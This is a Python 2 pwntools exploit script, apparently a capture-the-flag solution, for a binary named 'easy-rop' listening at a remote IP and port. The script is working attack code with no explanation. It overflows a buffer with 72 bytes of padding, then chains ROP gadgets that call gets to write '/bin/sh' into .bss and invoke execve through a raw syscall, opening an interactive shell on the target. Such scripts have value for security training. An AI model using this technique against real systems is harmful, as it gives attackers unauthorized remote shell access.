#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./easy-rop')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or '65.1.92.179'
port = int(args.PORT or 49153)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *0x401e85
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
padding = "A" * 72

syscall = 0x00000000004012d3
pop_rax = 0x00000000004175eb
pop_rbx = 0x000000000040205b
pop_rsi = 0x000000000040f4be
pop_rdi = 0x000000000040191a
pop_rdx = 0x000000000040181f
pop_r12 = 0x000000000040316f
mov_rdi_r12 = 0x0000000000452d70
bss = 0x4c2d10
rop = flat([

	padding,
	pop_rdi,
	bss,
	exe.sym['gets'],
	pop_rax,
	0x3b,
	pop_rdi,
	bss,
	pop_rsi,
	0x0,
	pop_rdx,
	0x0,
	syscall



])


io.recv()
io.sendline(rop)
io.sendline("/bin/sh\x00")
io.interactive()

